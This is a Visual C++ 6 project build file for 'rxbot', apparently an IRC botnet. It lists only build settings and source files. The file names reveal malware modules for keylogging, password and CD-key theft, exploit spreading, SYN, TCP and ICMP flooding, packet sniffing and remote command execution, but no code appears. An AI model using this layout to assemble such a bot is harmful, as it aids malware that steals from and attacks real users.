# Microsoft Developer Studio Project File - Name="rxbot" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=rxbot - WIN32 RELEASE
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "rxbot.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "rxbot.mak" CFG="rxbot - WIN32 RELEASE"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "rxbot - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE "rxbot - Win32 Debug" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe

!IF  "$(CFG)" == "rxbot - Win32 Release"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /W3 /GX /O1 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /machine:I386
# ADD LINK32 /nologo /subsystem:windows /machine:I386
# SUBTRACT LINK32 /pdb:none

!ELSEIF  "$(CFG)" == "rxbot - Win32 Debug"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Debug"
# PROP BASE Intermediate_Dir "Debug"
# PROP BASE Ignore_Export_Lib 0
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Debug"
# PROP Intermediate_Dir "Debug"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O1 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /MTd /W3 /Gi /GX /Od /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /FR /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib wsock32.lib wininet.lib /nologo /subsystem:windows /machine:I386 /align:4096
# SUBTRACT BASE LINK32 /pdb:none
# ADD LINK32 /nologo /subsystem:windows /profile /map /debug /machine:I386

!ENDIF 

# Begin Target

# Name "rxbot - Win32 Release"
# Name "rxbot - Win32 Debug"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Source File

SOURCE=.\advscan.cpp
# End Source File
# Begin Source File

SOURCE=.\aliaslog.cpp
# End Source File
# Begin Source File

SOURCE=.\autostart.cpp
# End Source File
# Begin Source File

SOURCE=.\beagle.cpp
# End Source File
# Begin Source File

SOURCE=.\capture.cpp
# End Source File
# Begin Source File

SOURCE=.\cdkeys.cpp
# End Source File
# Begin Source File

SOURCE=.\commands.cpp
# End Source File
# Begin Source File

SOURCE=.\connect.cpp
# End Source File
# Begin Source File

SOURCE=.\crc32.cpp
# End Source File
# Begin Source File

SOURCE=.\crypt.cpp
# End Source File
# Begin Source File

SOURCE=.\dcc.cpp
# End Source File
# Begin Source File

SOURCE=.\dcom.cpp
# End Source File
# Begin Source File

SOURCE=.\download.cpp
# End Source File
# Begin Source File

SOURCE=.\driveinfo.cpp
# End Source File
# Begin Source File

SOURCE=.\ehandler.cpp
# End Source File
# Begin Source File

SOURCE=.\findfile.cpp
# End Source File
# Begin Source File

SOURCE=.\findpass.cpp
# End Source File
# Begin Source File

SOURCE=.\fphost.cpp
# End Source File
# Begin Source File

SOURCE=.\ftptransfer.cpp
# End Source File
# Begin Source File

SOURCE=.\httpd.cpp
# End Source File
# Begin Source File

SOURCE=.\icmpflood.cpp
# End Source File
# Begin Source File

SOURCE=.\ident.cpp
# End Source File
# Begin Source File

SOURCE=.\irc_send.cpp
# End Source File
# Begin Source File

SOURCE=.\keylogger.cpp
# End Source File
# Begin Source File

SOURCE=.\loaddlls.cpp
# End Source File
# Begin Source File

SOURCE=.\lsarestrict.cpp
# End Source File
# Begin Source File

SOURCE=.\lsass.cpp
# End Source File
# Begin Source File

SOURCE=.\misc.cpp
# End Source File
# Begin Source File

SOURCE=.\net.cpp
# End Source File
# Begin Source File

SOURCE=.\netbios.cpp
# End Source File
# Begin Source File

SOURCE=.\netutils.cpp
# End Source File
# Begin Source File

SOURCE=.\pingudp.cpp
# End Source File
# Begin Source File

SOURCE=.\processes.cpp
# End Source File
# Begin Source File

SOURCE=.\protocol.cpp
# End Source File
# Begin Source File

SOURCE=.\psniff.cpp
# End Source File
# Begin Source File

SOURCE=.\redirect.cpp
# End Source File
# Begin Source File

SOURCE=.\remotecmd.cpp
# End Source File
# Begin Source File

SOURCE=.\rlogind.cpp
# End Source File
# Begin Source File

SOURCE=.\rndnick.cpp
# End Source File
# Begin Source File

SOURCE=.\rxbot.cpp
# End Source File
# Begin Source File

SOURCE=.\secure.cpp
# End Source File
# Begin Source File

SOURCE=.\session.cpp
# End Source File
# Begin Source File

SOURCE=.\shellcode.cpp
# End Source File
# Begin Source File

SOURCE=.\socks4.cpp
# End Source File
# Begin Source File

SOURCE=.\startup.cpp
# End Source File
# Begin Source File

SOURCE=.\synflood.cpp
# End Source File
# Begin Source File

SOURCE=.\sysinfo.cpp
# End Source File
# Begin Source File

SOURCE=.\tcpflood.cpp
# End Source File
# Begin Source File

SOURCE=.\tftpd.cpp
# End Source File
# Begin Source File

SOURCE=.\threads.cpp
# End Source File
# Begin Source File

SOURCE=.\visit.cpp
# End Source File
# Begin Source File

SOURCE=.\wildcard.cpp
# End Source File
# Begin Source File

SOURCE=.\workstation.cpp
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Source File

SOURCE=.\advscan.h
# End Source File
# Begin Source File

SOURCE=.\aliaslog.h
# End Source File
# Begin Source File

SOURCE=.\autostart.h
# End Source File
# Begin Source File

SOURCE=.\beagle.h
# End Source File
# Begin Source File

SOURCE=.\capture.h
# End Source File
# Begin Source File

SOURCE=.\cdkeys.h
# End Source File
# Begin Source File

SOURCE=.\commands.h
# End Source File
# Begin Source File

SOURCE=.\configs.h
# End Source File
# Begin Source File

SOURCE=.\connect.h
# End Source File
# Begin Source File

SOURCE=.\crc32.h
# End Source File
# Begin Source File

SOURCE=.\crypt.h
# End Source File
# Begin Source File

SOURCE=.\dcc.h
# End Source File
# Begin Source File

SOURCE=.\dcom.h
# End Source File
# Begin Source File

SOURCE=.\defines.h
# End Source File
# Begin Source File

SOURCE=.\download.h
# End Source File
# Begin Source File

SOURCE=.\driveinfo.h
# End Source File
# Begin Source File

SOURCE=.\ehandler.h
# End Source File
# Begin Source File

SOURCE=.\externs.h
# End Source File
# Begin Source File

SOURCE=.\findfile.h
# End Source File
# Begin Source File

SOURCE=.\findpass.h
# End Source File
# Begin Source File

SOURCE=.\fphost.h
# End Source File
# Begin Source File

SOURCE=.\ftptransfer.h
# End Source File
# Begin Source File

SOURCE=.\functions.h
# End Source File
# Begin Source File

SOURCE=.\globals.h
# End Source File
# Begin Source File

SOURCE=.\httpd.h
# End Source File
# Begin Source File

SOURCE=.\icmpflood.h
# End Source File
# Begin Source File

SOURCE=.\ident.h
# End Source File
# Begin Source File

SOURCE=.\includes.h
# End Source File
# Begin Source File

SOURCE=.\irc_send.h
# End Source File
# Begin Source File

SOURCE=.\keylogger.h
# End Source File
# Begin Source File

SOURCE=.\loaddlls.h
# End Source File
# Begin Source File

SOURCE=.\lsarestrict.h
# End Source File
# Begin Source File

SOURCE=.\lsass.h
# End Source File
# Begin Source File

SOURCE=.\misc.h
# End Source File
# Begin Source File

SOURCE=.\net.h
# End Source File
# Begin Source File

SOURCE=.\netbios.h
# End Source File
# Begin Source File

SOURCE=.\netutils.h
# End Source File
# Begin Source File

SOURCE=.\nicklist.h
# End Source File
# Begin Source File

SOURCE=.\passwd.h
# End Source File
# Begin Source File

SOURCE=.\pingudp.h
# End Source File
# Begin Source File

SOURCE=.\processes.h
# End Source File
# Begin Source File

SOURCE=.\protocol.h
# End Source File
# Begin Source File

SOURCE=.\psniff.h
# End Source File
# Begin Source File

SOURCE=.\redirect.h
# End Source File
# Begin Source File

SOURCE=.\remotecmd.h
# End Source File
# Begin Source File

SOURCE=.\rlogind.h
# End Source File
# Begin Source File

SOURCE=.\rndnick.h
# End Source File
# Begin Source File

SOURCE=.\rxbot.h
# End Source File
# Begin Source File

SOURCE=.\secure.h
# End Source File
# Begin Source File

SOURCE=.\session.h
# End Source File
# Begin Source File

SOURCE=.\shellcode.h
# End Source File
# Begin Source File

SOURCE=.\socks4.h
# End Source File
# Begin Source File

SOURCE=.\startup.h
# End Source File
# Begin Source File

SOURCE=.\synflood.h
# End Source File
# Begin Source File

SOURCE=.\sysinfo.h
# End Source File
# Begin Source File

SOURCE=.\tcpflood.h
# End Source File
# Begin Source File

SOURCE=.\tcpip.h
# End Source File
# Begin Source File

SOURCE=.\tftpd.h
# End Source File
# Begin Source File

SOURCE=.\threads.h
# End Source File
# Begin Source File

SOURCE=.\visit.h
# End Source File
# Begin Source File

SOURCE=.\wildcard.h
# End Source File
# Begin Source File

SOURCE=.\workstation.h
# End Source File
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# End Group
# End Target
# End Project
